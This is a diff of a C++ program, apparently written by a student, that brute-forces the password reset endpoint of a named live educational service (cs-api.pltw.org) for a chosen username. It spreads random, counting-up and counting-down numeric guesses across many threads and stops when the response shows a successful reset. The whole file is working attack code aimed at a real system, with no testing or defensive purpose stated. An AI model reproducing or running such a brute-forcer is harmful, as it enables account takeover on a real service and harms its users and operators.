@@ -14,9 +14,6 @@
 #include <vector>
 #include <chrono>
 #include "httplib.h"
-#include <queue>
-#include <functional>
-#include <condition_variable>
 
 
 //send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
@@ -30,54 +27,42 @@ int amntoftimes;
 int GetUserNameAndAmount();
 int SendReq();
 int SendReqUP();
+int SendReqDown();
+int guessdown();
 int guess();
 int guessup();
-int randomnumberUP = 1000;
+int randomnumberUP = 990;
 int menuswitch;
+int randomnumberDOWN = 10015;
 
-class threadpool{
-    public:
-    threadpool(size_t numthreads);
-    ~threadpool();
-    void enqueue(std::function<void()> task)
-
-    private:
-    std::vector<std::thread> workers;
-    std::queue<std::function<void()>> tasks;
-    std::mutex queueMutex;
-    std::condition_variable condition;
-    bool stop = false;
-};
-
-threadpool::threadpool(size_t numthreads){
-    for(size_t i = 0; i < numthreads; ++i)
-     workers.emplace_back([this]() {
-    while(true){
-        std::function<void()> task;
-        {
-            std::unique_lock<std::mutex> lock(this->queueMutex);
-            this->condition.wait(lock, [this]() { return this->stop || !this->tasks.empty();});
-            if (this->stop && this->tasks.empty())
-                return;
-            task = std::move(this->tasks.front());
-            this->tasks.pop();
-        }
-        task();
-    }
-    });
-}
-
-void threadpool::enqueue// ENDED HERE
 int menu(){
-    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Do both in threading" << "\n Select:";
+    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Down By One(9999 -> 9998)" << "\n4:Do all" << "\n Select:";
     std::cin >> menuswitch;
     switch(menuswitch){
-        case 1:
-        guess();
+        case 1:{
+        int numthreads;
+        std::cout << "How many threads:";
+        std::cin >> numthreads;
+         std::vector<std::thread> threads;
+        for (int i = 0; i < numthreads; ++i){
+            threads.push_back(std::thread(guess));
+        }for (auto &th : threads){
+            th.join();
+        }
+        }
         break;
         
-        case 2:
-        guessup();
+        case 2:{
+        int numthreads;
+        std::cout << "How many threads:";
+        std::cin >> numthreads;
+         std::vector<std::thread> threads;
+        for (int i = 0; i < numthreads; ++i){
+            threads.push_back(std::thread(guessup));
+        }for (auto &th : threads){
+            th.join();
+        }
+        }
         break;
 
         case 3:{
@@ -86,9 +71,25 @@ int menu(){
         std::cin >> numthreads;
          std::vector<std::thread> threads;
         for (int i = 0; i < numthreads; ++i){
-            if (i % 2 == 0){
+            threads.push_back(std::thread(guessdown));
+        }for (auto &th : threads){
+            th.join();
+        }
+        }
+        break;
+
+        case 4:{
+        int numthreads;
+        std::cout << "How many threads:";
+        std::cin >> numthreads;
+         std::vector<std::thread> threads;
+        for (int i = 0; i < numthreads; ++i){
+            if (i % 3 == 0){
                 threads.push_back(std::thread(guess));
-            }else {
+            } else if (i % 2 == 0){
+                threads.push_back(std::thread(guessdown));
+            }
+            else {
                 threads.push_back(std::thread(guessup));
             }
         }
@@ -109,11 +110,7 @@ int guess(){
     amntoftimes -= 1;
     unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
         srand(seed);
-    
-    do{
-        randomnumber = rand() % 9000 + 1000;
-    } while (tried_numbers.find(randomnumber)!= tried_numbers.end());
-    tried_numbers.insert(randomnumber);
+        randomnumber = rand() % randomnumberDOWN + randomnumberUP;
     std::cout << "Password Being Tried:" << randomnumber << "\n";
      SendReq();
      }else{
@@ -133,13 +130,22 @@ int guessup(){
     return(0);
 }
 
+int guessdown(){
+    if(amntoftimes != 0){
+    amntoftimes -= 1;
+    randomnumberDOWN -= 1;
+    std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
+    SendReqDown();
+       }
+       return(0);
+}
+
 int SendReqUP(){
-    httplib::Client client ("https://cs-api.pltw.org");
+    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
     std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberUP);
-    auto res = client.Post(endpoint.c_str(), "", "text/plain");
+    auto res = client->Post(endpoint.c_str(), "", "text/plain");
 
     if (res){
-        std::cout << "Status:" << res->status << "\n";
         std::cout << "Response" << res->body << "\n";
          if(res->body.find(USERP) != std::string::npos){
           std::cout << "Password reset successful for user " << USERP << ".\n";
@@ -147,17 +153,17 @@ int SendReqUP(){
     }else{
         std::cerr << "Request Failed. (Rate limited?)\n";
     }
+    delete client;
         guessup();
     return res ? res->status : -1;
 }
 
-int SendReq(){
-    httplib::Client client ("https://cs-api.pltw.org");
-    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
-    auto res = client.Post(endpoint.c_str(), "", "text/plain");
+int SendReqDown(){
+    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
+    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumberDOWN);
+    auto res = client->Post(endpoint.c_str(), "", "text/plain");
 
     if (res){
-        std::cout << "Status:" << res->status << "\n";
         std::cout << "Response" << res->body << "\n";
          if(res->body.find(USERP) != std::string::npos){
           std::cout << "Password reset successful for user " << USERP << ".\n";
@@ -165,6 +171,25 @@ int SendReq(){
     }else{
         std::cerr << "Request Failed. (Rate limited?)\n";
     }
+    delete client;
+        guessdown();
+    return res ? res->status : -1;
+}
+
+int SendReq(){
+    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
+    std::string endpoint = "/" + USERP + "/reset?password=" + std::to_string(randomnumber);
+    auto res = client->Post(endpoint.c_str(), "", "text/plain");
+
+    if (res){;
+        std::cout << "Response" << res->body << "\n";
+         if(res->body.find(USERP) != std::string::npos){
+          std::cout << "Password reset successful for user " << USERP << ".\n";
+            exit(0); }
+    }else{
+        std::cerr << "Request Failed. (Rate limited?)\n";
+    }
+    delete client;
         guess();
     return res ? res->status : -1;
 }
